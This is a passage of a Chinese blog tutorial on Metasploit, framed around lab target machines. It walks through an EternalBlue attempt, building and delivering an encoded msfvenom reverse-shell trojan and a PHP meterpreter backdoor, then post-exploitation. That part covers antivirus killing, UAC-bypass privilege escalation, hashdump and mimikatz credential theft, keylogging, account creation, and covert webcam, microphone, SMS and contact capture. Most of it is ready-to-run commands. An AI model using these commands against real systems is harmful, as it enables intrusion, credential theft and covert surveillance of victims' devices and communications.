<p>4 然后我们执行扫描 输入 run</p> 
<p>发现了 可能存在漏洞的主机</p> 
<p><strong>4 渗透利用</strong></p> 
<hr> 
<p>1 加载 永恒之蓝漏洞利用模块</p> 
<p>use exploit/windows/smb/ms17_010_eternalblue</p> 
<p>2 输入 options 查看扫描模块需要配置的参数</p> 
<p>3.1 然后我们配置了rhost （rhost指的是目标主机ip）</p> 
<p>set rhost ip</p> 
<p>3.2 然后我们配置了 lhost （lhost指的是 监控主机或攻击机 ip）</p> 
<p>set lhost ip</p> 
<p>3.3 然后我们配置了 lport （指的是监控的端口 ）</p> 
<p>set lport ip</p> 
<p>注意端口必须没有被占用</p> 
<p>4 然后我们执行扫描 输入 run 执行永恒之蓝漏洞利用</p> 
<p>但是发现失败 提示 模块已经利用了 但是没有返回对应 session</p> 
<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-ERkkSXqK-1666167673708)(10-11 msfconsole漏洞利用流程.assets/bffdb79061ad4b0aa92d2dfde83e9f1b.png)]</p> 
<p>5 备选方案通过植入木马的方式进行利用</p> 
<hr> 
<p>1 我们知道目标机器是win系统 所以使用msfvenom 生成一个win平台的木马</p> 
<p>msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp</p> 
<p>LHOST=192.168.3.33 LPORT=4446 -e x86/shikata_ga_nai -b ‘\x00\x0a\xff’ -i 10 -f exe -o payload.exe</p> 
<p>2 漏洞生成后 通过启动一个py服务将木马上传到目标机器</p> 
<p>python -m SimpleHTTPServer 80</p> 
<p>3 配置监控程序我们使用了</p> 
<p>use exploit/multi/handler</p> 
<p>3 输入 options进入配置</p> 
<p>3.1 然后我们配置了 lhost （lhost指的是 监控主机或攻击机 ip）</p> 
<p>set lhost ip</p> 
<p>3.2然后我们配置了 lport （指的是监控的端口 ）</p> 
<p>set lport ip</p> 
<p>注意端口必须和msfvenom 生成的木马端口一样才行</p> 
<p>4 配置攻击载荷 payload</p> 
<p>set payload windows/meterpreter/reverse_tcp</p> 
<p>5 执行利用等待目标机器执行木马</p> 
<p>6 目标机器执行了木马</p> 
<p>利用成功并获得meterpreter</p> 
<hr> 
<p>5 后渗透利用</p> 
<p>进入新文档</p> 
<p>6 报告阶段</p> 
<h2><a id="12_meterpreter_749"></a>12 meterpreter介绍</h2> 
<p><strong>一、 Meterpreter是什么</strong></p> 
<p>Meterpreter是Metasploit框架中的一个利器，作为漏洞溢出后的攻击载荷使用，攻击载荷在触发漏洞后会返回一个由我们控制的通道，可用于远程执行命令!<br> Metasploit提供了各个主流平台的Meterpreter版本，包括Windows、Linux，同时支持x86、x64平台，另外，Meterpreter还提供了基于PHP和Java语言的实现。Meterpreter的工作模式是纯内存的，好处是启动隐藏，很难被杀毒软件监测到。不需要访问目标主机磁盘，所以也没什么入侵的痕迹。除上述外，Meterpreter还支持Ruby脚本形式的扩展。所以Ruby语言还很有必要了解下。</p> 
<p><strong>二、Meterpreter中常用的反弹类型</strong></p> 
<p>1.reverse_tcp<br> 这是一个基于TCP的反向链接反弹shell, 使用起来很稳定</p> 
<p><strong>三、Meterpreter的常用命令</strong></p> 
<p><strong>1.基本命令</strong></p> 
<p>help# 查看Meterpreter帮助</p> 
<p>background#返回，把meterpreter后台挂起<br> bgkill# 杀死一个 meterpreter 脚本<br> bglist#提供所有正在运行的后台脚本的列表<br> bgrun#作为一个后台线程运行脚本<br> channel#显示活动频道<br> sessions -i number # 与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用<br> sesssions -k number #与会话进行交互<br> close# 关闭通道<br> exit# 终止 meterpreter 会话<br> quit# 终止 meterpreter 会话<br> interact id #切换进一个信道<br> run#执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等<br> irb# 进入 Ruby 脚本模式<br> read# 从通道读取数据write# 将数据写入到一个通道<br> run和bgrun# 前台和后台执行以后它选定的 meterpreter 脚本<br> use# 加载 meterpreter 的扩展<br> load/use#加载模块<br> Resource#执行一个已有的rc脚本</p> 
<p><strong>2 常用命令</strong></p> 
<p><strong>2.1 针对安卓手机的一些命令</strong></p> 
<p>获取手机通讯录： dump_contacts</p> 
<p>获取短信记录：dump_sms</p> 
<p>控制实验手机发短信：send_sms -d 15330252525 -t<br> “hello”</p> 
<p>获取实验手机GPS定位信息：geolocate</p> 
<p>获取实验手机Wi-Fi定位信息：wlan_geolocate</p> 
<p>控制实验手机录音：record_mic<br> -d 5</p> 
<p>获取实验手机相机设备：webcam_list</p> 
<p>控制实验手机拍照 ：webcam_snap</p> 
<p>直播实验手机摄像头：webcam_stream</p> 
<p><strong>2.2 针对Windows的一些命令</strong></p> 
<p>查看进程：ps</p> 
<p>查看当前进程号：getpid</p> 
<p>查看系统信息：sysinfo</p> 
<p>查看目标机是否为虚拟机：run<br> post/windows/gather/checkvm</p> 
<p>查看完整网络设置：route</p> 
<p>查看当前权限：getuid</p> 
<p>自动提权：getsystem</p> 
<p>关闭杀毒软件：run post/windows/manage/killav</p> 
<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p> 
<p>列举当前登录的用户：run post/windows/gather/enum_logged_on_users</p> 
<p>查看当前应用程序：run post/windows/gather/enum_applications</p> 
<p>抓取目标机的屏幕截图：load espia ； screengrab</p> 
<p>获取相机设备：webcam_list</p> 
<p>控制拍照 ：webcam_snap</p> 
<p>直播摄像头：webcam_stream</p> 
<p>控制录音：record_mic</p> 
<p>查看当前处于目标机的那个目录：pwd</p> 
<p>查看当前目录：getlwd</p> 
<p>导出当前用户密码哈希 run hashdump</p> 
<p>用户名：SID：LM哈希：NTLM哈希:::</p> 
<p>也可以使用下面这个命令导出 权限更高 run windows/gather/smart_hashdump</p> 
<p>抓取自动登录的用户名和密码 run windows/gather/credentials/windows_autologin</p> 
<p>直接获取明文密码（注意这个功能需要获取系统权限 获取系统权限需要输入getsystem）</p> 
<p>首选终端输入 load kiwi 加载kiwi</p> 
<p>creds_all：列举所有凭据<br> creds_kerberos：列举所有kerberos凭据<br> creds_msv：列举所有msv凭据<br> creds_ssp：列举所有ssp凭据<br> creds_tspkg：列举所有tspkg凭据<br> creds_wdigest：列举所有wdigest凭据<br> dcsync：通过DCSync检索用户帐户信息<br> dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID<br> golden_ticket_create：创建黄金票据<br> kerberos_ticket_list：列举kerberos票据<br> kerberos_ticket_purge：清除kerberos票据<br> kerberos_ticket_use：使用kerberos票据<br> kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令<br> lsa_dump_sam：dump出lsa的SAM<br> lsa_dump_secrets：dump出lsa的密文<br> password_change：修改密码<br> wifi_list：列出当前用户的wifi配置文件<br> wifi_list_shared：列出共享wifi配置文件/编码</p> 
<p><strong>3.文件系统命令</strong></p> 
<p>cat c:\boot.ini#查看文件内容,文件必须存在<br> del c:\boot.ini #删除指定的文件<br> upload /root/Desktop/netcat.exe c:\ # 上传文件到目标机主上，如upload setup.exe C:\windows\system32<br> download nimeia.txt /root/Desktop/ # 下载文件到本机上如：download C:\boot.ini /root/或者download C:\“ProgramFiles”\Tencent\QQ\Users\295****<em><em>125\Msg2.0.db /root/<br> edit c:\boot.ini # 编辑文件<br> getlwd#打印本地目录<br> getwd#打印工作目录<br> lcd#更改本地目录<br> ls#列出在当前目录中的文件列表<br> lpwd#打印本地目录<br> pwd#输出工作目录<br> cd c:\ #进入目录文件下<br> rm file #删除文件<br> mkdir dier #在受害者系统上的创建目录<br> rmdir#受害者系统上删除目录<br> dir#列出目标主机的文件和文件夹信息<br> mv#修改目标主机上的文件名<br> search -d d:\www -f web.config #search 文件，如search -d c:\ -f</em>.doc<br> meterpreter &gt; search -f autoexec.bat #搜索文件<br> meterpreter &gt; search -f sea</em>.bat c:\xamp\<br> enumdesktops #用户登录数</p> 
<h2><a id="13_PHP_904"></a>13 PHP后门反弹连接演示文档</h2> 
<p><strong>一、 环境准备</strong></p> 
<p><strong>1 DVWA靶场</strong></p> 
<p>DVWA下载：<a href="https://codeload.github.com/ethicalhack3r/DVWA/zip/master" rel="nofollow">https://codeload.github.com/ethicalhack3r/DVWA/zip/master</a></p> 
<p>注意：配置DVWA环境 准备PHP7.0以上，和 Nginx环境<br> 1 配置数据库密码 配置 config/config.inc.php.dist 文件（注意后门的 .dist要通过重命名删掉）<br> 2 使用浏览器访问 http://XxIP/setup.php<br> 3 红字问题解决<br> 4 缺少key 直接替换下面2句 或者 访问https://www.google.com/recaptcha/admin/create<br> $_DVWA[ ‘recaptcha_public_key’ ] = ‘6LdJJlUUAAAAAH1Q6cTpZRQ2Ah8VpyzhnffD0mBb’;<br> $_DVWA[ ‘recaptcha_private_key’ ] = ‘6LdJJlUUAAAAAM2a3HrgzLczqdYp4g05EqDs-W4K’;<br> 5 allow_url_include: Disabled 提示没开启<br> 找到php目录里的php.ini allow_url_include 将后面参数OFF 改成On 修改完成重启Nginx生效</p> 
<p><strong>2 Metasploit任意平台</strong></p> 
<p>可以是Windows版，可以是kali自带版</p> 
<p><strong>二、Metasploit配置监控及攻击载荷</strong></p> 
<p><strong>1 配置监控-使用handler模块</strong></p> 
<p><strong>use exploit/multi/handler</strong></p> 
<p><img src="https://images2.imgbox.com/74/77/muMKSEDJ_o.png" alt="img"> 2 配置攻击载荷设置payload</p> 
<p><strong>第一步设置payload</strong></p> 
<p><strong>set payload php/meterpreter/reverse_tcp</strong></p> 
<p><strong>第二步设置 lhost 和 lport</strong></p> 
<p><strong>set lhost xxxip ；</strong></p> 
<p><strong>set lport xxx端口；</strong></p> 
<p><img src="https://images2.imgbox.com/5a/c9/hs9ywjws_o.png" alt="img"></p> 
<p><strong>3 生成php后门执行攻击获得meterpreter</strong></p> 
<p>新建一个终端在终端内输入</p> 
<p>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.3.23 lport=4456 R&gt;shell.php</p> 
<p><img src="https://images2.imgbox.com/fb/ea/C9IzhcJD_o.png" alt="img"></p> 
<p>3.2 传播- 使用Python简单的web服务</p> 
<p>python -m SimpleHTTPServer 80</p> 
<p><img src="https://images2.imgbox.com/d6/5f/oUIYo0Y0_o.png" alt="img"></p> 
<p>将shell.php</p> 
<p>3.3 执行攻击获得meterpreter</p> 
<p><img src="https://images2.imgbox.com/c5/91/9GpofJSQ_o.png" alt="img"></p> 
<p>run 或者exploit</p> 
<p>获取到meterpreter 我们就可以做渗透操作了</p> 
<p>比如 观看屏幕 可以在meterpreter里输入</p> 
<p>run vnc</p> 
<p>查看当前账号可以在meterpreter里输入</p> 
<p>getuid</p> 
<h2><a id="14__982"></a>14 后渗透之访问文件系统</h2> 
<p><strong>一、后渗透之访问文件系统</strong></p> 
<p>1.文件交互指令</p> 
<table><thead><tr><th align="center">ID</th><th align="left">Command</th><th align="left">Description</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">cat</td><td align="left">读取文件内容</td></tr><tr><td align="center">2</td><td align="left">cd</td><td align="left">切换靶机目录</td></tr><tr><td align="center">3</td><td align="left">cp</td><td align="left">复制文件到目标</td></tr><tr><td align="center">4</td><td align="left">mv</td><td align="left">移动到目标</td></tr><tr><td align="center">5</td><td align="left">chmod</td><td align="left">修改文件权限（比如chmod 777 shell.elf）</td></tr><tr><td align="center">6</td><td align="left">del / rm</td><td align="left">删除靶机文件</td></tr><tr><td align="center">7</td><td align="left">dir</td><td align="left">打印靶机目录</td></tr><tr><td align="center">8</td><td align="left">mkdir</td><td align="left">在靶机上创建目录</td></tr><tr><td align="center">9</td><td align="left">rmdir</td><td align="left">删除靶机目录</td></tr><tr><td align="center">10</td><td align="left">edit</td><td align="left">编辑文件</td></tr><tr><td align="center">11</td><td align="left">getlwd</td><td align="left">打印本地目录</td></tr><tr><td align="center">12</td><td align="left">getwd</td><td align="left">打印靶机目录</td></tr><tr><td align="center">13</td><td align="left">lcd</td><td align="left">更改本地目录</td></tr><tr><td align="center">14</td><td align="left">lls</td><td align="left">列出本地目录</td></tr><tr><td align="center">15</td><td align="left">ls</td><td align="left">列出靶机文件目录</td></tr><tr><td align="center">16</td><td align="left">lpwd</td><td align="left">打印本地目录</td></tr><tr><td align="center">17</td><td align="left">pwd</td><td align="left">打印工作目录</td></tr><tr><td align="center">19</td><td align="left">search</td><td align="left">搜索文件 详情search -h</td></tr></tbody></table> 
<p>Linux权限理解</p> 
<p>chmod 777 {文件名.后缀}</p> 
<p>chmod 777 shell.elf</p> 
<h2><a id="15__1015"></a>15 后渗透之上传下载文件</h2> 
<table><thead><tr><th align="center">ID</th><th>Command</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">1</td><td>upload</td><td align="center">传文件到靶机</td></tr><tr><td align="center">2</td><td>download</td><td align="center">从靶机下载文件</td></tr></tbody></table> 
<h2><a id="16__1022"></a>16 后渗透之屏幕截图</h2> 
<table><thead><tr><th>ID</th><th>Command</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td>screenshot</td><td>截图（Windows）</td></tr></tbody></table> 
<h2><a id="17__1028"></a>17 后渗透之键盘记录</h2> 
<table><thead><tr><th>ID</th><th>Conmmand</th><th>Description</th></tr></thead><tbody><tr><td>1</td><td>keyscan_start</td><td>启动键盘记录(Windows)</td></tr><tr><td>2</td><td>keyscan_dump</td><td>导出键盘(Windows)</td></tr><tr><td>3</td><td>keyscan_stop</td><td>停止键盘记录(Windows)</td></tr></tbody></table> 
<h2><a id="18_Windows_1036"></a>18 后渗透之创建账户（Windows）</h2> 
<p>一、环境准备</p> 
<p>1 MSF-Metasploit Framework</p> 
<p>2 一台获取到meterpreter的靶机</p> 
<p>二、实际操作</p> 
<p>1、先看下目标靶机已存在用户 meterpreter中输入：run post/windows/gather/enum_logged_on_users</p> 
<p>2、使用getgui创建 一个用户名为 msb 密码为 123456 的账户</p> 
<p>run getgui -u msb -p 123456</p> 
<p>run getgui -u {用户名}-p {密码}</p> 
<p>进入win的运行输入netplwiz 可以查看账户创建情况</p> 
<p>[-] Insufficient privileges, account was not be created. 看到这个提示就需要先提权（获取到system）</p> 
<p>2.1 绕过UAC提权</p> 
<p>use exploit/windows/local/<em>ask</em></p> 
<h2><a id="19__1065"></a>19 后渗透之调用音频设备录音</h2> 
<p>一、环境准备<br> MSF-Metasploit Framework<br> 一台安装手机或者模拟器<br> 二、实践</p> 
<p>record_mic 包含4个可选参数 分别为</p> 
<p>-d 是设置录音时长的</p> 
<p>-f 设置未见路径的</p> 
<p>-h 查看帮助的</p> 
<p>-p 控制自动播放的</p> 
<p>一条简单的录音语句</p> 
<p>record_mic -d 10 -p true</p> 
<h2><a id="20__1086"></a>20 后渗透之提权</h2> 
<p><strong>一、环境准备</strong></p> 
<p>1 MSF-Metasploit Framework</p> 
<p>2 一台windiows靶机</p> 
<p><strong>二、实战</strong></p> 
<p>1 提权方法（Windows）查看当前获得用户的权限 meterpreter 中输入： getuid</p> 
<p>方法一、 meterpreter中输入：getsystem</p> 
<p>方法二、使用msf模块提权</p> 
<p>要想提权必须是已经拿到meterpreter 然后将当前meterpreter 后台 meterprerer中输入 background</p> 
<p>1、 查看可用模块 MSF终端中输入 search bypassuac 查看提权模块</p> 
<p>2、 选择一个适合当前系统的提权模块 我这边使用的是win10系统</p> 
<p>那我们使用：use exploit/windows/local/bypassuac_windows_store_reg 尝试提权</p> 
<p>这个模块不行就换一个 use exploit/windows/local/bypassuac_sluihijack</p> 
<p>或者 use exploit/windows/local/bypassuac_dotnet_profiler</p> 
<p>3 配置模块使用参数 终端内输入： show options</p> 
<p>4 可以看到需要配置 session 终端内输入：set session {需要提权的session id}</p> 
<p>5 执行提权 终端内输入：run</p> 
<p>6 获取到meterpreter后 我们在终端内 输入getuid 看实际还没有提权成功 需要在还终端内在输入 getsystem 获取权限</p> 
<p>7 获取权限完成后 输入getuid 即可看到 已经获取到SYSTEM 最高权限了</p> 
<p>看到这个证明已经将权限提升成功</p> 
<h2><a id="21_Windows_1133"></a>21 后渗透之获取登录密码（Windows）</h2> 
<p><strong>一、环境准备</strong></p> 
<p>1 MSF-Metasploit Framework</p> 
<p>2 一台windiows靶机</p> 
<p><strong>二、实战</strong></p> 
<p>首先获得一个有SYSTEM权限的meterpreter</p> 
<p>1 抓取自动登录账户密码</p> 
<p>2 导出SAM数据库本地账户密码文件</p> 
<p>3 导出密码哈希</p> 
<p>4 使用kiwi模块获取</p> 
<hr> 
<p>1 很多人喜欢给在计算机设置自动登录 我们可以通过抓取自动登录的账户密码</p> 
<p>run windows/gather/credentials/windows_autologin</p> 
<p>如果提示这证明本机并没有配置自动登录</p> 
<p>2 还可以通过导出SAM数据库中的本地用户账号（注意需要提权到SYSTEM）</p> 
<p>run post/windows/gather/smart_hashdump</p> 
<table><thead><tr><th>用户名</th><th>SID</th><th>LM哈希:</th><th>NTLM哈希1:::</th></tr></thead><tbody><tr><td>mb</td><td>1000</td><td>aad3b435b51404eeaad3b435b51404ee</td><td>32ed87bdb5fdc5e9cba88547376818d4</td></tr></tbody></table> 
<p>3 使用 hashdump 获取密码（注意需要提权到SYSTEM才能使用）</p> 
<p>终端内输入 run hashdump</p> 
<p>使用在线解析工具 <a href="https://www.cmd5.com/" rel="nofollow">https://www.cmd5.com/</a></p> 
<p>NTLM哈希 例子：32ed87bdb5fdc5e9cba88547376818d4</p> 
<p>4 使用load kiwi（使用kiwi模块需要system权限）</p> 
<p>kiwi_cmd 模块可以让我们使用mimikatz的全部功能， mimikatz 的命令直接在kiwi_cmd里直接使用</p> 
<p>5.1 终端输入 load kiwi</p> 
<p>5.2 creds_all 直接获取密码</p> 
<p>5.3 使用 kiwi_cmd sekurlsa::logonpasswords 获取密码</p> 
<table><thead><tr><th>ID</th><th>kiwi参数和描述</th></tr></thead><tbody><tr><td>1</td><td>creds_all：列举所有凭据</td></tr><tr><td>2</td><td>creds_kerberos：列举所有kerberos凭据</td></tr><tr><td>3</td><td>creds_msv：列举所有msv凭据</td></tr><tr><td>4</td><td>creds_ssp：列举所有ssp凭据</td></tr><tr><td>5</td><td>creds_tspkg：列举所有tspkg凭据</td></tr><tr><td>6</td><td>creds_wdigest：列举所有wdigest凭据</td></tr><tr><td>7</td><td>dcsync：通过DCSync检索用户帐户信息</td></tr><tr><td>8</td><td>dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</td></tr><tr><td>9</td><td>golden_ticket_create：创建黄金票据</td></tr><tr><td>10</td><td>kerberos_ticket_list：列举kerberos票据</td></tr><tr><td>11</td><td>kerberos_ticket_purge：清除kerberos票据</td></tr><tr><td>12</td><td>kerberos_ticket_use：使用kerberos票据</td></tr><tr><td>13</td><td>kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</td></tr><tr><td>14</td><td>lsa_dump_sam：dump出lsa的SAM</td></tr><tr><td>15</td><td>lsa_dump_secrets：dump出lsa的密文</td></tr><tr><td>16</td><td>password_change：修改密码</td></tr><tr><td>17</td><td>wifi_list：列出当前用户的wifi配置文件</td></tr><tr><td>18</td><td>wifi_list_shared：列出共享wifi配置文件/编码</td></tr></tbody></table> 
<h2><a id="22_Windows_1222"></a>22 后渗透之远程监控（Windows）</h2> 
<p><strong>一、环境准备</strong></p> 
<p>1 rdesktop</p> 
<p>在线安装 rdesktop</p> 
<hr> 
<p>Debian,Ubuntu,kali下使用以下命令</p> 
<p>apt-get install rdesktop</p> 
<hr> 
<p>Centos/RedHat可以通过yum命令</p> 
<p>yum -y install rdesktop</p> 
<p>2 一台windiows靶机（没有物理电脑可以使用虚拟机代替）</p> 
<p>3 MSF-Metasploit Framework</p> 
<p><strong>二、实战</strong></p> 
<p>1 使用rdesktop远程控制</p> 
<p>说明：rdesktop是linux下支持Windows远程桌面连接的客户端程序，在linux系统下可通过它远程访问Windows桌面，支持多种版本。rdesktop是sourceforge下支持GPL协议的一个开源项目，采用RDP（Remote Desktop Protocol,远程桌面协议），几乎可以连接windows的所有版本</p> 
<p>rdesktop常用参数</p> 
<table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>-u</td><td>账户名</td></tr><tr><td>2</td><td>-p</td><td>密码</td></tr><tr><td>3</td><td>-a 16</td><td>指使用16位色显示远程画面</td></tr><tr><td>4</td><td>-f</td><td>全屏模式（用<strong>Ctrl+Alt+Enter</strong> 组合键退出全屏）</td></tr><tr><td>5</td><td>-g</td><td>设置分辨率 如 : -g 1024x768</td></tr><tr><td>6</td><td>rdesktop -h</td><td>查看rdesktop使用帮助</td></tr></tbody></table> 
<p>rdesktop -u 用户名 -p 密码 -f IP</p> 
<p>rdesktop -u mb -p 123456 -f -g 1024x720 192.168.110.24</p> 
<p>如果远程计算机没有启动远程功能我们可以在meterpreter中输入</p> 
<p>启动远程桌面协议：run post/windows/manage/enable_rdp</p> 
<hr> 
<p>2 通过vnc远程</p> 
<h2><a id="23__1275"></a>23 后渗透之调用摄像头</h2> 
<p><strong>一、环境准备</strong></p> 
<p>1 MSF-Metasploit Framework</p> 
<p>2 一台windiows靶机</p> 
<p>3 一台安卓设备，没有可以使用模拟器</p> 
<p><strong>二、实战</strong></p> 
<p>靶机获取到meterpreter后我们可以使用 webcam模块实现调用软，硬件摄像头</p> 
<p>webcam模块支持命令</p> 
<table><thead><tr><th>id</th><th>模块名</th><th>解释</th></tr></thead><tbody><tr><td>1</td><td><strong>webcam_list</strong></td><td>列出靶机中的所有软，硬件摄像头列表，并编号</td></tr><tr><td>2</td><td><strong>webcam_snap</strong></td><td>可调用单个软，硬件摄像头拍照，默认调用第一个摄像头</td></tr><tr><td>3</td><td><strong>webcam_stream</strong></td><td>可调用单个软，硬件摄像头直播，默认调用第一个摄像头</td></tr></tbody></table> 
<p>1 webcam_list</p> 
<p>2 webcam_snap 调用单个软，硬件摄像头拍照</p> 
<table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>-h</td><td>显示帮助</td></tr><tr><td>2</td><td>-i</td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>3</td><td>-p</td><td>-p /root "root"设置存储路径</td></tr><tr><td>4</td><td>-q</td><td>-q 100 “100” 表示存储图片的质量默认为 50</td></tr><tr><td>5</td><td>-v</td><td>-v false -v 2个参数 true 和 false 这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table> 
<p>3 webcam_stream 调用单个软，硬件摄像头直播</p> 
<table><thead><tr><th>id</th><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>1</td><td>-h</td><td>显示帮助</td></tr><tr><td>2</td><td>-d</td><td>-d 100 “100”=100秒 设置流持续时间为100秒 默认为1800</td></tr><tr><td>3</td><td>-i</td><td>-i 1 “1”代表调用摄像头编号</td></tr><tr><td>4</td><td>-q</td><td>-q 100 “100”指流质量 默认为50</td></tr><tr><td>5</td><td>-s</td><td>-s live “live”指流文件路径 默认输出在当前目录（注意目录不存在不会自动创建）</td></tr><tr><td>7</td><td>-f</td><td>-f live “live”指播放文件的存储地址 默认输出在当前目录</td></tr><tr><td>8</td><td>-v</td><td>-v false -v 2个参数 true 和 false 这个参数表示拍照后自动打开,默认参数为true</td></tr></tbody></table>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/e6113fbb5652982df68ca25e70cc69ec/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">uniapp 获取手机号</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/fac2f41370d4d38cd35cdcd81311a8f0/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">Clbalt Strike安装及使用详解</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>